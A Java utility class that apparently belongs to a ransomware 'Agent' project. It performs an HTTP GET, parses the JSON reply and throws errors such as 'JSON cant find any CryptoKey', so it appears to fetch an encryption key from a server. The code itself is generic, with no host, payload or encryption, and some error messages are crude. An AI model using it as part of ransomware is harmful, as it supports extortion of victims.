package Agent.Utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.http.HttpStatus;
import Agent.exceptions.HttpResException;
import Agent.exceptions.InOutException;
import Agent.exceptions.JsonException;
import Agent.exceptions.RansomwareException;

public class HttpUtil {
	private static int httpCode;


	private static boolean isSucceed(int statusCode) {
	
		return (statusCode >= HttpStatus.OK.value()&& statusCode < HttpStatus.MULTIPLE_CHOICES.value());

	}

	private static boolean isServerFault(int statusCode) {
		return (statusCode >= HttpStatus.INTERNAL_SERVER_ERROR.value());
	}

	public static Object get(String urlToRead) throws RansomwareException {
		StringBuilder sb = new StringBuilder();
		HttpURLConnection conn = null;
		URL url;

		try {
			url = new URL(urlToRead);
			conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("GET");
			httpCode = conn.getResponseCode();
			System.out.println("code - " + httpCode);
		} catch (IOException e) {
			throw new InOutException("connection failed", e.getCause());
		}
		if (isSucceed(httpCode)) {
			try (BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));) {
				String line;
				while ((line = rd.readLine()) != null) {
					sb.append(line);

				}
				JSONObject json = new JSONObject(sb.toString());
				return json;

			} catch (IOException e) {
				throw new InOutException("headers problem", e.getCause());
			} catch (JSONException e) {
				throw new JsonException("JSON cant find any CryptoKey", e.getCause());
			}
		} else if (isServerFault(httpCode)) {
			throw new HttpResException("server fucked up");
		} else {
			throw new HttpResException("you fucked it up");
		}
	}
}
